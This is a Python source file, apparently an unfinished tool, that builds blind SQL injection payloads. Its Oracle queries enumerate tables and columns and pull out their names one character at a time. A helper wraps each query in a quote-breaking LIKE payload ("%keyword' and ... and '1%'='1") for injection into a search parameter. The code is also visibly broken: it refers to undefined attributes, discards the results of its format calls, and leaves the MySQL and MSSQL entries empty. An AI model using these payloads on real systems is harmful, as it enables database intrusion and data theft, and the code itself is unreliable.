class attackQuerys:
    DB_table_count = {'oracle':"select count(TABLE_NAME) from user_tables",
                      'mysql':"",
                      'mssql':""}
    DB_table_length = {'oracle':"select length(TABLE_NAME) from(select TABLE_NAME,rownum as rnum from user_tables) where rnum={}",
                       'mysql':"",
                       'mssql':""}
    DB_table_letter = {'oracle':"select ASCII(substr(TABLE_NAME,{},1)) from(select TABLE_NAME,rownum as rnum from user_tables)where rnum={}",
                       'mysql':"",
                       'mssql':""}

    DB_column_count= {'oracle':"select count(COLUMN_NAME) from user_tab_columns where TABLE_NAME={}",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}
    DB_column_length= {'oracle':"select length(COLUMN_NAME) from (select COLUMN_NAME, rownum as rnum from user_tab_columns where TABLE_NAME={}) where rnum={}",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}
    DB_column_letter= {'oracle':"(select ascii(substr(COLUMN_NAME,1,1)) from (select COLUMN_NAME, rownum as rnum from user_tab_columns) where rnum={})",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}

    def __init__(self, DB_type='oracle'):
        self.DB_type = DB_type
    
    

    def get_count_query(self,type):
        if type=='table':
            name, variable_name = attackQuerys.DB_table_name[self.DB_type], attackQuerys.DB_table_variable_name[self.DB_type]
        elif type == 'column':
            name, variable_name = attackQuerys.DB_column_name[self.DB_type], attackQuerys.DB_column_variable_name[self.DB_type]

        base_query = f'select count({variable_name}) from {name}'

        if type == 'column':
            base_query +=f'where {name}'
        return "("+base_query+")"
    
    def get_length_query(self,type,rownum=0):
        if type=='table':
            name, variable_name = attackQuerys.DB_table_name[self.DB_type], attackQuerys.DB_table_variable_name[self.DB_type]
        elif type == 'column':
            name, variable_name = attackQuerys.DB_column_name[self.DB_type], attackQuerys.DB_column_variable_name[self.DB_type]

        base_query = 'select {} from (select {},rownum as rnum from {})where rnum={})'
        base_query.format(variable_name,variable_name,name)

        if rownum != 0:
            base_query.format(rownum)
        return "("+base_query+")"
    
    def get_complete_query(keyword,query):
        return f"%{keyword}' and " +query+ " and '1%'='1"

        
